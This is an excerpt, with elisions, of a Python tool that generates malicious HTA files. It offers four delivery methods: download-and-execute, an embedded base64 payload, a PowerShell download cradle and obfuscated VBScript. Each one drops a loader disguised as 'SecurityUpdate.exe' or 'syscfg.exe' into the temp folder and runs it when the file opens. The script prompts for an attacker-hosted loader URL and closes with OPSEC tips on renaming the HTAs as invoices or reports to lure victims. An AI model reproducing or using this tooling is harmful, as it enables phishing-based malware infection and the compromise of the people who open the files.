...
def create_option1_download_execute(loader_url, output_file):
    """Option 1: Direct Download & Execute"""
...
Sub Window_OnLoad
    ...
    ' Get temp folder
    tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
    loaderPath = tempFolder & "\\SecurityUpdate.exe"
...
<p>Loading security update...</p>
    ...
    print(f"[*] Method: Direct Download & Execute")
    print(f"[*] URL: {loader_url}")
    print(f"[!] Remember to host loader.exe at: {loader_url}")

def create_option2_embedded_base64(loader_path, output_file):
    """Option 2: Embedded Base64"""
...
Sub Window_OnLoad
    ...
    ' Get temp folder
    tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
    loaderPath = tempFolder & "\\viewer.exe"
...
def create_option3_powershell_cradle(loader_url, output_file):
    """Option 3: PowerShell Download Cradle"""
...
def create_option4_vbscript_obfuscated(loader_url, output_file):
    """Option 4: VBScript Obfuscated Multi-Stage"""
...
Sub Window_OnLoad
    ...
    x7 = x5.ExpandEnvironmentStrings("%TEMP%") & "\\sys" & "cfg.exe"
...
def main():
    ...
    if choice == '1':
        url = input("[?] Enter loader.exe URL (e.g., http://192.168.1.100/loader.exe): ").strip()
        output = input("[?] Output filename [download_execute.hta]: ").strip() or "download_execute.hta"
        create_option1_download_execute(url, output)
        
    elif choice == '2':
        loader = input("[?] Path to loader.exe [./loader.exe]: ").strip() or "./loader.exe"
        output = input("[?] Output filename [embedded_base64.hta]: ").strip() or "embedded_base64.hta"
        create_option2_embedded_base64(loader, output)
        
    elif choice == '3':
        url = input("[?] Enter loader.exe URL (e.g., http://192.168.1.100/loader.exe): ").strip()
        output = input("[?] Output filename [powershell_cradle.hta]: ").strip() or "powershell_cradle.hta"
        create_option3_powershell_cradle(url, output)
        
    elif choice == '4':
        url = input("[?] Enter loader.exe URL (e.g., http://192.168.1.100/loader.exe): ").strip()
        output = input("[?] Output filename [vbscript_obfuscated.hta]: ").strip() or "vbscript_obfuscated.hta"
        create_option4_vbscript_obfuscated(url, output)
        
    elif choice == '5':
        print("\n[*] Creating ALL HTA methods...")
        print("-" * 60)
        
        url = input("[?] Enter loader.exe URL (for methods 1,3,4): ").strip()
        loader = input("[?] Path to loader.exe (for method 2) [./loader.exe]: ").strip() or "./loader.exe"
        
        print("\n[*] Generating HTAs...")
        print("-" * 60)
        create_option1_download_execute(url, "1_download_execute.hta")
        print()
        create_option2_embedded_base64(loader, "2_embedded_base64.hta")
        print()
        create_option3_powershell_cradle(url, "3_powershell_cradle.hta")
        print()
        create_option4_vbscript_obfuscated(url, "4_vbscript_obfuscated.hta")
    ...
    print("    3. User opens HTA (double-click)")
    print("    4. Loader executes automatically")
    print("\n[!] For methods 1, 3, 4: Host loader.exe at the URL you specified")
    print("[!] For method 2: Payload is embedded, no external hosting needed")
    print("\n[*] OPSEC Tips:")
    print("    - Rename HTA to something legitimate (Invoice.hta, Report.hta)")
    print("    - Use HTTPS for download URLs")
    print("    - Test in isolated environment first")
